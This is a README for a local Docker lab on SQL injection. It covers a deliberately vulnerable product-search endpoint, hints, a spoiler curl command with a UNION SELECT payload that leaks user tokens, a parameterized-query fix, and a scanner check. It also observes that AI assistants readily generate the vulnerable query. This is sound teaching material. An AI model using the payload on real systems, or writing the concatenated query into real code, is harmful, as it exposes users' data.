# Lab: SQL Injection

> ⚠️ Runs only on `localhost:3300` inside Docker on your own machine. Only
> attack targets you own or are authorized to test — see
> [docs/attack-playbook.md](../../docs/attack-playbook.md).

A tiny product-search API with a classic string-concatenated SQL query
(CWE-89) — the same bug shape as [docs/rules.md#sql-injection](../../docs/rules.md#sql-injection-critical)
detects, but running for real so you can see the exploit work end to end.

## Goal

The `/products` endpoint is supposed to only return **released** products
in a given category. Find a way to make it leak the `secret_token` from the
`users` table instead — a `FLAG{...}` string.

## Start it

```bash
npm run lab:sql-injection:up
# ... wait a few seconds for the container to become healthy ...
curl "http://localhost:3300/products?category=electronics"
```

## Hints

<details>
<summary>Hint 1</summary>

The query looks roughly like:

```sql
SELECT id, name, price FROM products WHERE category = '<your input>' AND released = 1
```

What happens if `<your input>` contains a `'`?

</details>

<details>
<summary>Hint 2 (bigger hint)</summary>

You can close off the original query early with `--` (SQL comment, everything
after it on the line is ignored) and append your own `UNION SELECT` with the
same number of columns (3: `id, name, price`) pulling from a different table.

</details>

<details>
<summary>Solution (spoiler)</summary>

```bash
curl -G "http://localhost:3300/products" \
  --data-urlencode "category=nonexistent' UNION SELECT id, username, secret_token FROM users-- "
```

The response includes a row shaped like a product but actually containing a
user's `username` (as `name`) and `secret_token` (as `price`) — including
`FLAG{sql_injection_via_category_param}` for the `admin` user.

</details>

## See the fix work too

The same app can run in "safe mode" (parameterized query instead of string
concatenation) — same code, one line different (see `app/server.js`):

```bash
SAFE_MODE=1 docker compose -f labs/sql-injection/docker-compose.yml up -d --build
curl -G "http://localhost:3300/products" \
  --data-urlencode "category=nonexistent' UNION SELECT id, username, secret_token FROM users-- "
# -> empty array. The same payload is now just a literal (nonexistent) category string.
```

## Automated end-to-end check

`npm run lab:sql-injection:e2e` runs the whole thing non-interactively: it
starts the lab, runs the exploit and asserts it leaks the flag, then
restarts in safe mode and asserts the *same* exploit payload no longer
works. This is what proves the "fix" in `docs/rules.md` actually fixes
something, not just that the scanner stops complaining.

## Stop it

```bash
npm run lab:sql-injection:down
```

## Why this matters for "vibe coding"

The vulnerable version of this query is exactly the kind of code an AI
assistant will happily generate if you ask for "a product search endpoint"
without specifying parameterized queries — it's simple, it works in
testing, and it's broken:

```bash
npm run scan -- scan labs/sql-injection/app
```

flags the `db.prepare(sql).all()` call in `server.js`'s vulnerable branch —
and does **not** flag the `SAFE_MODE` branch two lines above it, since that
one passes `category` as a bound parameter instead of interpolating it into
the SQL text.
